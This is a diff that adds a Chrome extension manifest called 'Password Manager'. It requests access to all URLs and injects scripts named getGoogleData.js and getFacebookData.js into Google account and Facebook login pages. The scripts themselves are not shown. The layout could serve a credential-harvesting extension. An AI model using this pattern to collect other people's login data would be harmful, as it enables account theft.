@@ -1,0 +1,18 @@
+{
+  "manifest_version": 2,
+
+  "name": "Password Manager",
+  "description": "This is a custom password manager.",
+  "version": "1.0",
+  "permissions": ["<all_urls>"],
+  "content_scripts": [
+    {
+      "matches": ["https://accounts.google.com/*","http://accounts.google.com/*"],
+      "js": ["jquery.min.js","getGoogleData.js"]
+    },
+    {
+      "matches": ["https://www.facebook.com/","http://www.facebook.com/"],
+      "js": ["jquery.min.js","getFacebookData.js"]
+    }
+  ]
+}
